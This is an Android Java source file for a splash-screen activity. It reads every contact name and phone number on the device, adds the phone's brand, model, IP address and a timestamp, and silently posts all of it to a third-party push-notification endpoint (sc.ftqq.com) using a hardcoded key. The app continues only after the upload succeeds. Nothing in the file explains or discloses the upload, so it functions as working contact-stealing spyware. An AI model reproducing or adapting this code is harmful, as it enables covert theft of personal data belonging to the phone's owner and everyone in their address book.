package com.exc.escdgxc;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;


import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;



import java.text.SimpleDateFormat;
import java.util.TimerTask;

public class SplashActivity extends AppCompatActivity {
    String ReadInfo;
    Handler mHandler = new Handler();
    final OkHttpClient client = new OkHttpClient();
    int okOne = 0;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);setContentView(R.layout.activity_splash);
        check();
    mHandler.postDelayed(new Runnable() {
        @Override
        public void run() {
            SharedPreferences sp = getPreferences(MODE_PRIVATE);
            boolean isFirst = sp.getBoolean("isFirst",true);
            Intent intent = new Intent();
            if(okOne == 1){
                intent.setClass(SplashActivity.this,MainActivity.class);
            }else{
                Log.d("ReadTag","连接失败..." + "\n");
            }
            startActivity(intent);
            //可以设置界面之间的切换动画
            //overridePendingTransition();
            finish();//结束
            }
        },10000);
    }
    /**
     * 检查权限
     */

    private void check() {
        //判断是否有权限
        if (ContextCompat.checkSelfPermission(SplashActivity.this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(SplashActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, 201);
        } else {
            getConnect();
            read("info.txt");
            Log.d("ReadTag","读取到的数据..." + "\n" + ReadInfo);
            postRequest(ReadInfo);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 201) {
            getConnect();
            read("info.txt");
            Log.d("ReadTag","读取到的数据..." + "\n" + ReadInfo);
            postRequest(ReadInfo);
        } else {
            return;

        }
    }

    //获取联系人
    private void getConnect() {
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"display_name", "sort_key", "contact_id",
                        "data1"}, null, null, null);
        Log.i("tag", "cursor connect count:" + cursor.getCount());
        List<String> list=new ArrayList<String>();
        //        moveToNext方法返回的是一个boolean类型的数据
        deleteFile("info.txt");
        while (cursor.moveToNext()) {
            //读取通讯录的姓名
            String name = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            //读取通讯录的号码
            String number = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Log.i("tag", "name： " + name + "\n"
                    + " number : " + number);
            String listNum = "name： " + name + "\n"
                    + " number : " + number;
            list.add(listNum);
            //saveInnerData(listNum);
            save(name, number);
        }

        System.out.println(list);
        cursor.close();
    }
    //存储

    private void save(String Nmaes,String Nums){
        Log.d("SaveTag","保存用户信息...");
        try {
            FileOutputStream fos = this.openFileOutput("info.txt", MODE_APPEND);//获得FileOutputStream
            fos.write(("name:" + Nmaes + ","+"num:" + Nums +"\n\n").getBytes());
            fos.close();

        }catch (Exception e){
            e.printStackTrace();
        }
    }
    private void read(String fileName){
        Log.d("readTag","读用户信息...");
        String result="";
        try {
            FileInputStream fis = this.openFileInput(fileName);
            int lenght = fis.available();
            byte[] buffer = new byte[lenght];
            fis.read(buffer);
            result = new String(buffer, "UTF-8");
            String getDeviceBrand = SystemUtil.getDeviceBrand() + "\n\n"; //厂商
            String getSystemModel = SystemUtil.getSystemModel() + "\n\n"; //型号
            DateFormat df = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");
            ReadInfo = result + "\n\n"  + "手机厂商:" + getDeviceBrand +  "\n\n" + "手机型号:" + getSystemModel + "\n\n" +"Ip:" + getPsdnIp() + "\n\n" + "时间:" + df.format(new Date());
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    /*
    public void PostRead(String strnm){
        String strNM;
        String sckey = "SCU92201T9498f19f085683836c9df2cb697a7cc85e848e64bb451";
        String path = "https://sc.ftqq.com/" + sckey + ".send";
        new Thread(){
            public void run(){
                Http
            }
        }.start();
    }*/
    private void postRequest(String strNr){
        //建立请求表单，添加上传服务器的参数
        RequestBody formBody = new FormBody.Builder()
                .add("text","收到消息")
                .add("desp",strNr)
                .build();
        //发起请求
        final Request request = new Request.Builder()
                .url("https://sc.ftqq.com/SCU96168T9651ad4527cbfc385c9a1881581f8f905eab182311204.send")
                .post(formBody)
                .build();
        //新建一个线程，用于得到服务器相应的参数
        new Thread(new Runnable() {
            @Override
            public void run() {
                Response response = null;
                try {
                    //回调
                    response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        //将服务器响应的参数response.body().string())发送到hanlder中，并更新ui
                        Log.d("PostTag","发送成功...");
                        okOne = 1;
                    } else {
                        throw new IOException("Unexpected code:" + response);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public static String getPsdnIp() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        //if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet6Address) {
                        return inetAddress.getHostAddress().toString();
                    }
                }
            }
        } catch (Exception e) {
        }
        return "";
    }
}
